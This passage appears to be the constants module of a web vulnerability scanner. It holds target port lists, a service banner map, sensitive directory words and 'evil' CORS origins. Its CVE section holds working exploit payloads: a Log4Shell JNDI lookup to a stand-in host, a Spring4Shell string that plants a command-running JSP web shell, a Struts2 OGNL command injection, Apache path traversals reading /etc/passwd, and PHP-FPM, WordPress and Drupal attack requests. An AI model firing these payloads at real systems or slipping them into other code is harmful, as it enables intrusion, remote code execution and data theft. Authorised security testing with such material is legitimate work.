    22, 23, 21, 69, 111, 135, 139, 161, 162, 389, 445, 514, 515, 548, 554, 623, 631, 636, 873, 902, 1025, 1026, 1027, 1028, 1029, 1080, 1088, 1099, 1158, 1163, 1220, 1241, 1337, 1414, 1500, 1720, 1723, 1883, 1984, 2000, 2001, 2082, 2083, 2086, 2087, 2095, 2096, 2181, 2222, 2302, 2375, 2376, 2379, 2380, 2443, 2601, 2602, 2604, 3000, 3001, 3128, 3260, 3268, 3269, 3389, 3690, 4000, 4001, 4040, 4369, 4440, 4444, 4505, 4506, 4567, 4711, 4848, 5000, 5001, 5005, 5060, 5061, 5222, 5269, 5357, 5432, 5555, 5601, 5632, 5666, 5672, 5683, 5701, 5800, 5801, 5900, 5901, 5985, 5986, 6000, 6443, 6666, 6667, 6697, 7002, 7077, 7080, 7433, 7434, 7547, 7777, 8009, 8010, 8042, 8069, 8070, 8083, 8090, 8181, 8444, 8500, 8834, 9092, 9100, 9160, 9418, 9999, 10001, 10250, 10255, 10256, 10257, 11211, 15672, 16379, 20000, 27015, 28015, 30000, 31337, 47001, 50000, 50070, 55555, 62078,
]

# Common service banners (quick identification)
PORT_BANNERS = {
    21: "FTP",
    22: "SSH",
    23: "Telnet",
    25: "SMTP",
    53: "DNS",
    80: "HTTP",
    110: "POP3",
    143: "IMAP",
    443: "HTTPS",
    445: "SMB",
    993: "IMAPS",
    995: "POP3S",
    1433: "MSSQL",
    1521: "Oracle",
    3306: "MySQL",
    3389: "RDP",
    5432: "PostgreSQL",
    5900: "VNC",
    5984: "CouchDB",
    6379: "Redis",
    7001: "WebLogic",
    7199: "Cassandra JMX",
    7474: "Neo4j HTTP",
    7687: "Neo4j Bolt",
    8080: "HTTP-Alt",
    8086: "InfluxDB",
    8443: "HTTPS-Alt",
    8529: "ArangoDB",
    9042: "Cassandra",
    9200: "Elasticsearch",
    9300: "Elasticsearch-Transport",
    11211: "Memcached",
    15672: "RabbitMQ Mgmt",
    27017: "MongoDB",
    27018: "MongoDB-Shard",
    28017: "MongoDB-HTTP",
}


# ════════════════════════════════════════════════════════════════
# CVE / VULNERABILITY MARKERS
# ════════════════════════════════════════════════════════════════
CVE_MARKERS = {
    "CVE-2021-44228": {"name": "Log4Shell", "payload": "${jndi:ldap://atomic.example/x}", "applies_to": ["java","log4j"]},
    "CVE-2022-22965": {"name": "Spring4Shell", "payload": "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20=%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream();%20int%20a%20=%20-1;%20byte%5B%5D%20b%20=%20new%20byte%5B2048%5D;%20while((a=in.read(b))!=-1)%7B%20out.println(new%20String(b));%20%7D%20%7D%20%25%7Bc2%7Di", "applies_to": ["spring"]},
    "CVE-2017-5638": {"name": "Struts2 S2-045", "payload": "%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}", "applies_to": ["struts"]},
    "CVE-2021-41773": {"name": "Apache Path Traversal", "payload": "/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd", "applies_to": ["apache"]},
    "CVE-2021-42013": {"name": "Apache Path Traversal (2)", "payload": "/.%2e/.%2e/.%2e/.%2e/etc/passwd", "applies_to": ["apache"]},
    "CVE-2019-11043": {"name": "PHP-FPM RCE", "payload": "/index.php/PHP_VALUE%0Asession.auto_start=1", "applies_to": ["php"]},
    "CVE-2020-25213": {"name": "WordPress File Manager RCE", "payload": "/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php", "applies_to": ["wordpress"]},
    "CVE-2018-7600": {"name": "Drupalgeddon2", "payload": "/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax", "applies_to": ["drupal"]},
}


# ════════════════════════════════════════════════════════════════
# MISCELLANEOUS
# ════════════════════════════════════════════════════════════════
INTERESTING_DIR_WORDS = [
    "config","backup","db","database","dump","sql","env","git","composer","package",
    "app","web","admin","settings","old","new","test","dev","staging","prod",
    "private","internal","secret","credentials","passwd","password",
]

HTTP_METHODS_ALL = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS", "TRACE", "HEAD", "CONNECT"]

EVIL_ORIGINS = [
    "https://evil.example",
    "null",
    "http://localhost",
    "https://localhost",
    "https://atomic.example",
    "https://target.example",
]
